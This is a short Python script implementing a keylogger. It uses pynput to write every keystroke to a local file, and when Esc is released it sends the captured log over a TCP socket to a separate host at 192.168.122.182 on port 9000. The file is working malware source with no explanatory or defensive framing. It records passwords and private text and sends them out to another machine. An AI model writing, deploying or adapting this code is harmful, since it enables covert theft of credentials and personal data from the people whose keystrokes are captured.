import pynput
from pynput import keyboard
import socket
import os

def on_press(key):
    print(f'Key pressed: {key}')
    with open('keylogs.txt', 'a') as f:
        try:
            if hasattr(key, 'char') and key.char is not None:
                f.write(str(key.char))
            else:
                f.write(str(key).replace('<', '').replace('>', '') + ' ')
        except AttributeError:
            pass

def on_release(key):
    if key == keyboard.Key.esc:
        print('Stopping listener...')
        with open('keylogs.txt', 'rb') as f:
            data = f.read()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(('192.168.122.182', 9000))
            sent_data = sock.send(data)
            print('Sent:', sent_data)
        except Exception as e:
            print(f'Error transmitting data: {e}')
        finally:
            sock.close()
        return False

if not os.path.exists('keylogs.txt'):
    open('keylogs.txt', 'w').close()
    print('Keylogs file created.')

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: 
    listener.join()
